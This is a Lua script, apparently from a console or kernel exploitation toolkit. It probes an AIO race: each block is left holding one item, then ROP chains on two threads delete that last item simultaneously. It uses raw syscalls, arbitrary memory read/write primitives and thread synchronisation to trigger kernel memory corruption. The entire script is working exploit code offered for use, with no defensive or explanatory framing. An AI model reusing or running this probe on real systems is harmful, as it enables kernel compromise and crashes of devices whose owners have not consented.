-- CRASH_CLASS: HIGH
-- PROBE 642a: leave each block at count==1, then two threads delete the last item together
print("=== PROBE 642a: AIO RACE AT COUNT==1 ===")
local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return N(v) end return nil end
local NB=24
local data=memory.alloc(0x2000) local out=memory.alloc(0x40) local chk=memory.alloc(0x40)
for i=0,0x1FFC,4 do wd(N(data)+i,0) end
local sc669=mk(669) local sc664=mk(664) local sc662=mk(662) local sc454=mk(454)
local last=memory.alloc(NB*4)
local first=memory.alloc(NB*4)
local made=0
for b=0,NB-1 do
    wd(N(out),0)
    local o,r=pcall(function() return sc669(uint64(0x1001),uint64(N(data)),uint64(2),uint64(1),uint64(N(out))) end)
    local base=rd(N(out))
    if o and N(r)==0 and base and base>0 then
        wd(N(first)+b*4, base)
        wd(N(last)+b*4, base+0x10000)
        made=made+1
    else break end
end
print(string.format("[A] blocks=%d",made))
if made<4 then return end
local good=0
for b=0,made-1 do
    wd(N(chk),0x77777777)
    pcall(function() sc664(U(N(first)+b*4),uint64(1),uint64(N(chk))) end)
    local s1=rd(N(chk))
    wd(N(chk),0x77777777)
    pcall(function() sc664(U(N(last)+b*4),uint64(1),uint64(N(chk))) end)
    local s2=rd(N(chk))
    if s1==3 and s2==3 then good=good+1 end
end
print(string.format("[B] last-item polls=%d/%d",good,made))
if good<made then return end
-- parent deletes item0 of every block: count 2 -> 1
local ok0=0
local st0={}
for b=0,made-1 do
    wd(N(chk),0x77777777)
    local o,r=pcall(function() return sc662(U(N(first)+b*4),uint64(1),uint64(N(chk))) end)
    local st=rd(N(chk))
    if o and N(r)==0 and st==0 then ok0=ok0+1 else st0[#st0+1]=string.format("b%d:%s/%s",b,tostring(st),tostring(o and r or "err")) end
end
print(string.format("[C] item0 deleted ok=%d/%d %s",ok0,made,table.concat(st0," ")))
if ok0<made then print("[!] abort"); return end
local W=memory.alloc(8)
wq(N(W),uint64(0))
local stA=memory.alloc(made*4)
local stB=memory.alloc(made*4)
for i=0,made*4-1,4 do wd(N(stA)+i,0x77777777) wd(N(stB)+i,0x77777777) end
local function build(stp)
    local c=ropchain({fcall_stub_padding_size=0x50000,stack_size=0x20000})
    c:push_syscall_with_ret(mk(454), U(N(W)), uint64(2), uint64(0))
    for b=0,made-1 do
        c:push_syscall_with_ret(mk(662), U(N(last)+b*4), uint64(1), U(N(stp)+b*4))
    end
    return c
end
local ca=build(N(stA))
local cb=build(N(stB))
print("[D] chains built")
local ta=thread:new(ca)
local tb=thread:new(cb)
ta:run(true)
tb:run(true)
for i=1,600000 do local x=i end
wq(N(W),uint64(1))
local ow,rw=pcall(function() return sc454(U(N(W)),uint64(3),uint64(0x7fffffff)) end)
print(string.format("[E] wake rv=%s",tostring(ow and rw or "err")))
ta:join()
tb:join()
print("[F] joined")
local both,za,zb=0,0,0
local line=""
for b=0,made-1 do
    local a=rd(N(stA)+b*4) local c2=rd(N(stB)+b*4)
    if a==0 then za=za+1 end
    if c2==0 then zb=zb+1 end
    if a==0 and c2==0 then both=both+1 end
    if b<10 then line=line..string.format(" %d:%s/%s",b,tostring(a),tostring(c2)) end
end
print(string.format("[G] A zeros=%d B zeros=%d both=%d of %d",za,zb,both,made))
print("[H]"..line)
print(string.format("[I] alive=%d",N(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
print("[Z] alive")
